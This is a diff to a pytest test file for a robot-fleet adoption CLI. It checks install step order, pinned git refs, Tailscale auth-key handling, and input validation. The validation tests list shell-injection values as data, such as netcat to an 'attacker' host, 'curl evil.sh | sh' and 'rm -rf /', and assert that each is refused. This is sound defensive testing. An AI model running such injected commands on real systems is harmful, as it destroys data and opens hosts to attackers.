@@ -30,10 +30,30 @@ def test_an_anvil_takes_all_five_steps_in_order():
     ]
 
 
-def test_an_axol_takes_no_bridge():
+def test_an_axol_takes_the_endpoint_role_where_an_anvil_takes_a_bridge():
     # It publishes its own joint states from the agent and has no DDS graph for
     # a bridge to join, so installing one would place a service carrying nothing.
-    assert "fm-comms" not in [step.name for step in adopt.plan("axol")]
+    assert [step.name for step in adopt.plan("axol")] == [
+        "tailscale",
+        "fm-tools",
+        "machine-init",
+        "fm-comms-endpoint",
+        "fm-robot-agent",
+    ]
+
+
+def test_an_axol_installs_no_bridge():
+    scripts = "\n".join(step.script for step in adopt.plan("axol"))
+    assert "--role bridge" not in scripts
+    assert "--role endpoint" in scripts
+
+
+def test_every_robot_gets_the_fleet_env_file_before_the_agent():
+    """The agent's own installer refuses without it, so the order is the contract."""
+    for kind in ("anvil-openarm-v2", "axol"):
+        names = [step.name for step in adopt.plan(kind)]
+        assert names.index("fm-robot-agent") == len(names) - 1
+        assert any(name.startswith("fm-comms") for name in names)
 
 
 def test_the_robot_joins_the_tailnet_under_its_own_tag():
@@ -146,3 +166,211 @@ def test_every_step_stops_on_its_own_first_failure(ran):
 def test_a_command_line_that_cannot_be_honoured_is_a_usage_error(argv, ran):
     assert device.run_device(argv) == exits.USAGE
     assert ran == []
+
+
+# --- pinned refs -------------------------------------------------------------
+
+
+def _scripts(kind="anvil-openarm-v2", ref=""):
+    return "\n".join(step.script for step in adopt.plan(kind, ref=ref))
+
+
+def test_every_adopted_repo_has_a_pinned_ref():
+    """A repo reached without a pin is a repo whose default branch reaches a robot."""
+    assert set(adopt.REFS) == {"fm-tools", "fm-setup", "fm-comms", "fm-robot-agent"}
+
+
+def test_no_step_fetches_a_default_branch():
+    scripts = _scripts()
+    assert "/main/" not in scripts
+    assert "--branch main" not in scripts
+
+
+def test_each_pinned_ref_reaches_its_own_step():
+    scripts = _scripts()
+    for repo, ref in adopt.REFS.items():
+        assert ref in scripts, f"{repo} is not fetched at {ref}"
+
+
+def test_a_checkout_is_detached_and_never_pulls():
+    """A pinned tag has no upstream; a pull on it would move the host off the pin."""
+    scripts = _scripts()
+    assert "checkout --quiet --detach" in scripts
+    assert "git pull" not in scripts
+
+
+def test_a_tag_is_resolved_before_a_branch_of_the_same_name():
+    scripts = _scripts()
+    assert scripts.index("refs/tags/") < scripts.index("refs/remotes/origin/")
+
+
+def test_a_missing_ref_fails_the_step_rather_than_installing_something_else():
+    assert "has no ref" in _scripts()
+
+
+def test_an_override_applies_to_every_repo_at_once():
+    """A host layered from a mix of a branch and three tags is not reproducible."""
+    scripts = _scripts(ref="feat/robots-as-devices")
+    assert scripts.count("feat/robots-as-devices") >= len(adopt.REFS)
+    for ref in adopt.REFS.values():
+        assert ref not in scripts
+
+
+def test_an_axol_override_covers_its_steps():
+    scripts = _scripts(kind="axol", ref="feat/robots-as-devices")
+    assert "--role bridge" not in scripts
+    assert "feat/robots-as-devices" in scripts
+    for ref in adopt.REFS.values():
+        assert ref not in scripts
+
+
+def test_a_repo_with_no_pin_is_refused():
+    with pytest.raises(KeyError):
+        adopt.ref_for("fm-desktop")
+
+
+def test_an_override_needs_no_pin():
+    assert adopt.ref_for("fm-desktop", "v1.2.3") == "v1.2.3"
+
+
+# --- a ref reaches a root shell, so it is checked ----------------------------
+
+
+@pytest.mark.parametrize(
+    "ref",
+    [
+        'v1.0.0"; nc attacker 1234 && echo "x',
+        "v1.0.0; rm -rf /",
+        "v1.0.0 && curl evil.sh | sh",
+        "$(id)",
+        "`id`",
+        "v1.0.0\nsudo rm -rf /",
+        "main..evil",
+        "refs/heads/x.lock",
+        "-v1.0.0",
+        "",
+        "v" * 200,
+    ],
+)
+def test_a_ref_that_is_not_a_ref_is_refused(ref):
+    assert adopt.valid_ref(ref) is False
+
+
+@pytest.mark.parametrize(
+    "ref", ["v0.1.0-robots.1", "main", "feat/robots-as-devices", "v1.2.3", "abc1234"]
+)
+def test_a_real_ref_is_accepted(ref):
+    assert adopt.valid_ref(ref) is True
+
+
+def test_every_pinned_ref_passes_its_own_check():
+    for repo, ref in adopt.REFS.items():
+        assert adopt.valid_ref(ref), f"{repo} is pinned to an unusable ref"
+
+
+def test_an_injected_ref_never_reaches_a_rendered_script():
+    with pytest.raises(ValueError):
+        adopt.ref_for("fm-tools", "v1.0.0; rm -rf /")
+
+
+def test_the_cli_refuses_an_injected_ref_before_any_ssh(ran):
+    code = device.run_device(
+        [
+            "adopt", "anvil-workcell", "--role", "robot",
+            "--robot", "anvil-openarm-v2", "--ref", "v1.0.0; rm -rf /",
+        ]
+    )
+    assert code == exits.USAGE
+    assert ran == []
+
+
+# --- the router endpoint -----------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "endpoint",
+    ["tcp/rune:7447", "tcp/100.111.147.125:7447", "tcp/adiis-mac-mini.tailbd5302.ts.net:7447"],
+)
+def test_a_real_locator_is_accepted(endpoint):
+    assert adopt.valid_router(endpoint) is True
+
+
+@pytest.mark.parametrize(
+    "endpoint",
+    [
+        "tcp/rune:7447; rm -rf /",
+        "tcp/$(id):7447",
+        "tcp/`id`:7447",
+        "rune:7447",
+        "tcp/rune",
+        "tcp/rune:notaport",
+        "",
+    ],
+)
+def test_a_locator_that_is_not_one_is_refused(endpoint):
+    assert adopt.valid_router(endpoint) is False
+
+
+def test_the_cli_refuses_an_injected_router_before_any_ssh(ran):
+    code = device.run_device(
+        [
+            "adopt", "anvil-workcell", "--role", "robot",
+            "--robot", "anvil-openarm-v2", "--router", "tcp/rune:7447; rm -rf /",
+        ]
+    )
+    assert code == exits.USAGE
+    assert ran == []
+
+
+@pytest.mark.parametrize("kind", ["anvil-openarm-v2", "axol"])
+def test_the_router_reaches_the_fm_comms_step_of_either_kind(kind):
+    step = next(s for s in adopt.plan(kind, router="tcp/rune:7447") if s.name.startswith("fm-comms"))
+    assert "export FM_ROUTER_ENDPOINT=tcp/rune:7447" in step.script
+
+
+def test_the_router_is_exported_rather_than_written_into_the_file():
+    """fm-comms owns that file's format; a second writer is the drift it warns about."""
+    scripts = "\n".join(s.script for s in adopt.plan("axol", router="tcp/rune:7447"))
+    assert "fm-comms.env" not in scripts
+
+
+def test_no_router_export_appears_when_none_was_given():
+    scripts = "\n".join(s.script for s in adopt.plan("axol"))
+    assert "FM_ROUTER_ENDPOINT" not in scripts
+
+
+# --- the tailnet a robot already has -----------------------------------------
+
+
+def test_joining_never_evicts_a_tailnet_the_robot_already_has():
+    """A vendor-supported robot may already be a node on the vendor's tailnet."""
+    step = adopt.plan("axol")[0]
+    assert "tailscale login" in step.script
+    assert "tailscale up" not in step.script
+    assert "logout" not in step.script
+
+
+def test_the_authkey_is_forwarded_to_the_tailscale_step_only(monkeypatch):
+    monkeypatch.setenv(adopt.AUTHKEY_VAR, "tskey-secret")
+    assert adopt._authkey_prefix("tailscale", "tskey-secret").startswith("export TS_AUTHKEY=")
+    assert adopt._authkey_prefix("fm-robot-agent", "tskey-secret") == ""
+
+
+def test_no_authkey_means_no_export_line():
+    assert adopt._authkey_prefix("tailscale", "") == ""
+
+
+def test_an_authkey_is_quoted_before_it_reaches_a_shell():
+    assert adopt._authkey_prefix("tailscale", "tskey; rm -rf /") == (
+        "export TS_AUTHKEY='tskey; rm -rf /'\n"
+    )
+
+
+def test_a_dry_run_never_prints_the_key(monkeypatch, capsys):
+    monkeypatch.setenv(adopt.AUTHKEY_VAR, "tskey-secret")
+    device.run_device(
+        ["adopt", "fm-rob-02", "--role", "robot", "--robot", "axol", "--dry-run"]
+    )
+    printed = capsys.readouterr().out
+    assert "tskey-secret" not in printed
+    assert "<redacted, from this shell>" in printed
